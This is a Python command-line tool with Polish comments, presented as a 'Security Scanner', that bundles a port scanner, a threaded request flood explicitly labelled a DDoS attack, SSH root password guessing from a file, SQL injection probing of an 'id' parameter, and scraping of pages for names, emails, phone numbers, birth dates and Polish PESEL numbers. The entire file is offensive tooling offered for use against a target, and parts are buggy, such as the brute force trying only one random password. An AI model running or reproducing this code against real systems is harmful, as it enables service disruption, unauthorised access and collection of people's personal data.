import socket
import requests
import threading
import paramiko
import re
import argparse
import logging
import random
import os
from bs4 import BeautifulSoup
import sys

# Stałe
TIMEOUT = 0.5

# Inicjalizacja loggera
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def scan_ports(target, start_port, end_port):
    """
    Funkcja skanująca porty na podanym adresie IP w danym zakresie.
    """
    open_ports = []
    for port in range(start_port, end_port + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(TIMEOUT)
                s.connect((target, port))
                open_ports.append(port)
                logging.info(f"Found open port: {port}")
        except:
            pass
    return open_ports

def ddos_attack(target, num_requests=None):
    """
    Funkcja przeprowadzająca atak DDoS na podany cel.
    """
    num_requests = num_requests or random.randint(100, 1000)

    def send_request():
        try:
            requests.get(target)
            logging.info("Sent request to target")
        except:
            pass

    threads = []
    for i in range(num_requests):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

def brute_force(target, passwords_file):
    """
    Funkcja przeprowadzająca atak brute force na SSH z wykorzystaniem podanej listy haseł.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    passwords_file = os.path.join("data", passwords_file)
    if os.path.exists(passwords_file):
        try:
            with open(passwords_file, "r") as f:
                passwords = f.readlines()
                if passwords:
                    password = random.choice(passwords).strip()
                    try:
                        ssh.connect(target, username="root", password=password)
                        logging.info(f"Brute force successful. Found password: {password}")
                        return password
                    except:
                        pass
                else:
                    logging.warning("Empty passwords file.")
        except:
            logging.error("Error reading passwords file.")
            sys.exit(1)
    else:
        logging.error("Passwords file not found.")
        sys.exit(1)

    logging.warning("Brute force unsuccessful. Password not found.")
    return None

def sql_injection(target_url, sql_file):
    """
    Funkcja przeprowadzająca test SQL injection na podanej stronie internetowej.
    """
    sql_file = os.path.join("data", sql_file)
    if os.path.exists(sql_file):
        try:
            with open(sql_file, "r") as f:
                sql_queries = f.readlines()
                if sql_queries:
                    for query in sql_queries:
                        query = query.strip()
                        url = f"{target_url}?id={query}"
                        try:
                            response = requests.get(url)
                            if "error" in response.text.lower() or "database" in response.text.lower():
                                logging.info(f"SQL injection vulnerability found. Query: {repr(query)}, Response: {repr(response.text)}")
                                return query, response.text
                        except:
                            pass
                else:
                    logging.warning("Empty SQL file.")
        except:
            logging.error("Error reading SQL file.")
            sys.exit(1)
    else:
        logging.error("SQL file not found.")
        sys.exit(1)

    logging.warning("SQL injection vulnerability not found.")
    return None

def personal_data_scan(target_url):
    """
    Funkcja przeprowadzająca skanowanie danych osobowych na podanej stronie internetowej.
    """
    patterns = {
        "Name": r"\b[A-Z][a-z]+\s[A-Z][a-z]+\b",
        "Email": r"\b[\w.-]+@[a-zA-Z]+\.[a-zA-Z]{2,3}\b",
        "Phone Number": r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b",
        "Date of Birth": r"\b\d{1,2}/\d{1,2}/\d{4}|\d{4}-\d{1,2}-\d{1,2}\b",
        "PESEL": r"\b\d{11}\b"
    }

    data = []
    try:
        response = requests.get(target_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for key, pattern in patterns.items():
            matches = soup.find_all(text=re.compile(pattern))
            if matches:
                logging.info(f"Found {key}: {matches}")
                data.append((key, matches))
    except Exception as e:
        logging.error(f"An error occurred during personal data scan: {e}")
    return data

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Security Scanner")
    parser.add_argument("-t", "--target", help="Target IP address or URL")
    parser.add_argument("-sp", "--start_port", type=int, default=1, help="Start port for scanning")
    parser.add_argument("-ep", "--end_port", type=int, default=100, help="End port for scanning")
    parser.add_argument("-a", "--action", choices=["scan_ports", "ddos", "brute_force", "sql_injection", "personal_data_scan"], help="Action to perform")
    parser.add_argument("-n", "--num_requests", type=int, help="Number of requests for DDoS attack")
    parser.add_argument("-pf", "--passwords_file", help="File containing passwords for brute force attack")
    parser.add_argument("-sf", "--sql_file", help="File containing SQL queries for SQL injection test")
    args = parser.parse_args()

    if args.target:
        if args.action == "scan_ports":
            open_ports = scan_ports(args.target, args.start_port, args.end_port)
            logging.info("Open ports: {}".format(open_ports))
        elif args.action == "ddos":
            ddos_attack(args.target, args.num_requests)
        elif args.action == "brute_force" and args.passwords_file:
            brute_force(args.target, args.passwords_file)
        elif args.action == "sql_injection" and args.sql_file:
            sql_injection(args.target, args.sql_file)
        elif args.action == "personal_data_scan":
            personal_data_scan(args.target)
        else:
            logging.error("Invalid action or missing required argument.")
    else:
        logging.error("Target is required.")
